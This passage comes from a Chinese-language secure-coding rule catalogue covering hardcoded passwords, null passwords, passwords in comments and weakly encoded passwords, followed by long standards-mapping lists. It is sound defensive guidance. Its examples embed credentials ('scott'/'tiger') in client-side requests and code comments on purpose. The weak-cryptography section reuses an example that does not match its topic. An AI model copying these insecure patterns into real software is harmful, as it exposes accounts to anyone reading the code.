<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[40] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication </p>
<p>[41] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authentication (WASC-01) </p>
<h4 id="Password-Management-Hardcoded-Password"><a href="#Password-Management-Hardcoded-Password" class="headerlink" title="Password Management: Hardcoded Password"></a>Password Management: Hardcoded Password</h4><h5 id="ABSTRACT-66"><a href="#ABSTRACT-66" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Hardcoded password 可能会削弱系统安全性，一旦出现安全问题将无法轻易修正。</p>
<h5 id="EXPLANATION-66"><a href="#EXPLANATION-66" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>使用硬编码方式处理密码绝非好方法。这不仅是因为所有项目开发人员都可以使用通过硬编码方式处理的密码，而且还会使解决这一问题变得极其困难。在代码投入使用之后，除非对软件进行修补，否则将无法更改密码。如果受密码保护的帐户遭受入侵，系统所有者将必须在安全性和可用性之间做出选择。</p>
<p>示例：以下代码使用 hardcoded password 来连接应用程序和检索地址簿条目：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">obj = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">obj.open(&apos;GET&apos;,&apos;/fetchusers.jsp?id=&apos;+form.id.value,&apos;true&apos;,&apos;scott&apos;,&apos;tiger&apos;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>该代码会正常运行，但是任何能够访问其中所包含的网页的人都能得到这个密码。</p>
<h5 id="RECOMMENDATIONS-66"><a href="#RECOMMENDATIONS-66" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>绝不能对密码进行硬编码。通常情况下，应对密码加以模糊化，并在外部资源文件中进行管理。如果将密码以明文形式存储在网站中任意位置，会造成任何有充分权限的人读取和无意中误用密码。对于需要输入密码的 JavaScript 引用，最好在连接时就提示用户输入密码。</p>
<h5 id="REFERENCES-65"><a href="#REFERENCES-65" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 259, CWE ID 798 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [13] CWE ID 287, [19] CWE ID 798 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-000196, CCI-001199, CCI-002367, CCI-003109 </p>
<p>[4] Standards Mapping - FIPS200 IA </p>
<p>[5] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 2.3.1 Authenticator Lifecycle Requirements, 2.6.2 Look-up Secret Verifier Requirements, 2.7.1 Out of Band Verifier Requirements, 2.7.2 Out of Band Verifier Requirements, 2.7.3 Out of Band Verifier Requirements, 2.8.4 Single or Multi Factor One Time Verifier Requirements, 2.8.5 Single or Multi Factor One Time Verifier Requirements, 2.10.1 Service Authentication Requirements, 2.10.2 Service Authentication Requirements, 2.10.4 Service Authentication Requirements, 3.5.2 Token-based Session Management, 3.5.2 Token-based Session Management, 3.7.1 Defenses Against Session Management Exploits, 6.4.1 Secret Management, 6.4.1 Secret Management, 9.2.3 Server Communications Security Requirements, 10.2.3 Malicious Code Search </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.8, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.4 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.3 - Authentication and Access Control, Control Objective 6.3 - Sensitive Data Protection, Control Objective 7 - Use of Cryptography </p>
<p>[22] Standards Mapping - SANS Top 25 2009 Porous Defenses - CWE ID 259 </p>
<p>[23] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 798 </p>
<p>[24] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 798 </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[42] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication </p>
<p>[43] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authentication (WASC-01) </p>
<h4 id="Password-Management-Null-Password"><a href="#Password-Management-Null-Password" class="headerlink" title="Password Management: Null Password"></a>Password Management: Null Password</h4><h5 id="ABSTRACT-67"><a href="#ABSTRACT-67" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Null password 可导致代码混乱。</p>
<h5 id="EXPLANATION-67"><a href="#EXPLANATION-67" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>使用 null 密码绝非好方法。</p>
<p>示例：以下代码最初会将密码设置为 null：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">var password=null;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    password=getPassword(user_data);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">if(password==null)&#123;</span><br><span class="line"></span><br><span class="line">    // Assumption that the get didn&apos;t work</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-67"><a href="#RECOMMENDATIONS-67" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为避免混乱，应当立即为秘码变量指定正确的变量。</p>
<h5 id="REFERENCES-66"><a href="#REFERENCES-66" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 259 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [13] CWE ID 287, [19] CWE ID 798 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-000196, CCI-001199, CCI-003109 </p>
<p>[4] Standards Mapping - FIPS200 IA </p>
<p>[5] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 2.3.1 Authenticator Lifecycle Requirements, 2.6.2 Look-up Secret Verifier Requirements, 2.7.1 Out of Band Verifier Requirements, 2.7.2 Out of Band Verifier Requirements, 2.7.3 Out of Band Verifier Requirements, 2.8.4 Single or Multi Factor One Time Verifier Requirements, 2.8.5 Single or Multi Factor One Time Verifier Requirements, 2.10.1 Service Authentication Requirements, 2.10.2 Service Authentication Requirements, 2.10.4 Service Authentication Requirements, 3.5.2 Token-based Session Management, 3.7.1 Defenses Against Session Management Exploits, 6.4.1 Secret Management, 9.2.3 Server Communications Security Requirements, 10.2.3 Malicious Code Search </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.8, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.4 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 2.2 - Secure Defaults, Control Objective 5.3 - Authentication and Access Control, Control Objective 6.3 - Sensitive Data Protection, Control Objective 7 - Use of Cryptography </p>
<p>[22] Standards Mapping - SANS Top 25 2009 Porous Defenses - CWE ID 259 </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I </p>
<p>[40] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication </p>
<p>[41] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authentication (WASC-01) </p>
<h4 id="Password-Management-Password-in-Comment"><a href="#Password-Management-Password-in-Comment" class="headerlink" title="Password Management: Password in Comment"></a>Password Management: Password in Comment</h4><h5 id="ABSTRACT-68"><a href="#ABSTRACT-68" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>以明文形式在系统或系统代码中存储密码或密码详细信息可能会以无法轻松修复的方式危及系统安全。</p>
<h5 id="EXPLANATION-68"><a href="#EXPLANATION-68" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>使用硬编码方式处理密码绝非好方法。在注释中存储密码详细信息等同于对密码进行硬编码。这不仅会使所有项目开发人员都可以查看密码，而且还会使解决这一问题变得极其困难。在代码投入使用之后，密码便会外泄，除非对软件进行修补，否则将无法保护或更改密码。如果受密码保护的帐户遭受入侵，系统所有者将必须在安全性和可用性之间做出选择。</p>
<p>示例：以下注释指定连接到数据库的默认密码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">// Default username for database connection is &quot;scott&quot;</span><br><span class="line"></span><br><span class="line">// Default password for database connection is &quot;tiger&quot;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>该代码可以正常运行，但是有权访问该代码的任何人都能得到这个密码。一旦程序发布，除非修补该程序，否则可能无法更改数据库用户“scott”和密码“tiger”。雇员可以利用手中掌握的信息访问权限入侵系统。</p>
<h5 id="RECOMMENDATIONS-68"><a href="#RECOMMENDATIONS-68" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>绝不能对密码进行硬编码。通常情况下，应对密码加以模糊化，并在外部资源文件中进行管理。在系统中采用明文的形式存储密码，会造成任何有充分权限的人读取和无意中误用密码。</p>
<h5 id="REFERENCES-67"><a href="#REFERENCES-67" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 615 </p>
<p>[2] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-000196, CCI-001199, CCI-002367 </p>
<p>[3] Standards Mapping - FIPS200 IA </p>
<p>[4] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage </p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage </p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[11] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.8, Requirement 8.4 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 6.1 - Sensitive Data Protection, Control Objective 7 - Use of Cryptography </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I </p>
<p>[37] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[38] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Password-Management-Weak-Cryptography"><a href="#Password-Management-Weak-Cryptography" class="headerlink" title="Password Management: Weak Cryptography"></a>Password Management: Weak Cryptography</h4><h5 id="ABSTRACT-69"><a href="#ABSTRACT-69" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>采用普通的编码方式给密码加密并不能有效地保护密码。</p>
<h5 id="EXPLANATION-69"><a href="#EXPLANATION-69" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当密码以明文形式存储在应用程序的属性文件或其他配置文件中时，会发生 password management 漏洞。程序员试图通过编码函数来遮蔽密码，以修补 password management 漏洞，例如使用 64 位基址编码方式，但都不能起到充分保护密码的作用。</p>
<p>示例：以下代码使用 hardcoded password 来连接应用程序和检索地址簿条目：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">obj = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">obj.open(&apos;GET&apos;,&apos;/fetchusers.jsp?id=&apos;+form.id.value,&apos;true&apos;,&apos;scott&apos;,&apos;tiger&apos;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>该代码会正常运行，但是任何能够访问其中所包含的网页的人都能得到这个密码。</p>
<h5 id="RECOMMENDATIONS-69"><a href="#RECOMMENDATIONS-69" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>绝不能采用明文的形式存储密码。应由管理员在系统启动时输入密码。如果这种方法不切实际，一个安全性较差、但通常都比较恰当的解决办法是将密码模糊化，并把这些去模糊化的资源分散到系统各处，因此，要破译密码，攻击者就必须取得并正确合并多个系统资源。</p>
<p>有些第三方产品宣称可以采用更加安全的方式管理密码。例如，WebSphere Application Server 4.x 用简单的异或加密算法加密数值，但是请不要对诸如此类的加密方式给予完全的信任。WebSphere 以及其他一些应用服务器通常都只提供过期的且相对较弱的加密机制，这对于安全性敏感的环境来说是远远不够的。较为安全的解决方法来是采用由用户创建的所有者机制，而这似乎也是如今唯一可行的方法。</p>
<h5 id="REFERENCES-68"><a href="#REFERENCES-68" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 261 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [13] CWE ID 287 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-000196, CCI-001199 </p>
<p>[4] Standards Mapping - FIPS200 IA </p>
<p>[5] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
